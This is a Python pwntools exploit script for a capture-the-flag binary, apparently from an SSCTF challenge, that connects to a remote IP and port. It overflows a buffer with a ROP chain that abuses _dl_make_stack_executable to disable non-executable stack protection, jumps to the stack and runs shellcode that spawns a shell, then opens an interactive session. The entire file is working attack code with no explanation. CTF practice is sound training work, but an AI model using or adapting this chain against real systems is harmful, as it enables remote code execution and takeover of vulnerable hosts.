
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='i386', log_level='debug')
# sh = process('./ret2libc164')
elf = ELF('./250')
# readgot=elf.got['read']
# putsplt=elf.plt['puts']
# main_addr = elf.symbols['main']
main_addr =0x0000000000400908
pop_rdi = 0x0000000000400a93
pop_eax =0x080b89e6
sh = remote("111.200.241.244",60956)
# sh = process("./250")
_stack_prot_addr =0x080EAFEC
#read(0,0x80e9fe4,0x4) to set stack_prot=7
read_addr = 0x0806D510
# payload = 'a' * 0x3a + 'b'*0x8 + p32(read_addr) +
_dl_make_stack_executable_hook = elf.symbols['_dl_make_stack_executable_hook']
'''''_dl_make_stack_executable 
.text:0809A260                 or      ds:__stack_prot, 7 
.text:0809A267                 mov     eax, [ebp+arg_10] 
.text:0809A26A                 call    _dl_make_stack_executable_hook 
'''
call_dl_make_stack_executable = 0x809A260
# inc dword ptr [ecx] ; ret
inc_p_ecx = 0x080845f8
pop_ecx = 0x080df1b9
jmp_esp = 0x080de2bb

sh.sendlineafter('SSCTF[InPut Data Size]', str(0x100))

payload = 'a' * 0x3A + p32(0x80A0B05 - 0x18)
#_dl_make_stack_executable_hook
payload += p32(pop_ecx) + p32(_dl_make_stack_executable_hook) + p32(inc_p_ecx)
payload += p32(call_dl_make_stack_executable) + p32(jmp_esp)
# shellcode
payload += asm(shellcraft.i386.linux.sh())

# raw_input()
sh.sendlineafter('SSCTF[YourData]', payload)



sh.interactive()
